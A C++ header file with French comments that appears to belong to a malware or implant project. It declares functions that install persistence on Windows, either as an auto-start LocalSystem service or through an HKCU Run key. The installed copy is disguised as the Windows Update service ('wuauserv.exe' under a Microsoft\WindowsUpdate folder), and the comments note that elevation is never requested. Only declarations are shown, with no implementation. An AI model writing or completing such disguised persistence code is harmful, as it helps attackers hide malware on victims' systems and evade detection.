#pragma once
#include <string>

// Installe la persistance la plus forte possible selon le contexte :
//   - eleve   : copie dans %ProgramData% + service AUTO_START (LocalSystem)
//   - sinon   : copie dans %LOCALAPPDATA% + valeur HKCU\...\Run
// Ne demande jamais l'elevation : si elle n'est pas la, on prend le repli.
bool install_persistence();

// Vrai si le processus dispose d'un token eleve (UAC).
bool process_is_elevated();

// Emplacements utilises par chaque chemin (niveau service / niveau utilisateur).
std::wstring install_dir();          // %ProgramData%\Microsoft\WindowsUpdate
std::wstring installed_exe_path();   // ...\wuauserv.exe
std::wstring user_install_dir();     // %LOCALAPPDATA%\Microsoft\WindowsUpdate
std::wstring user_exe_path();        // ...\wuauserv.exe

// Retire la persistance utilisateur : valeur Run + copie LocalAppData.
void remove_user_persistence();
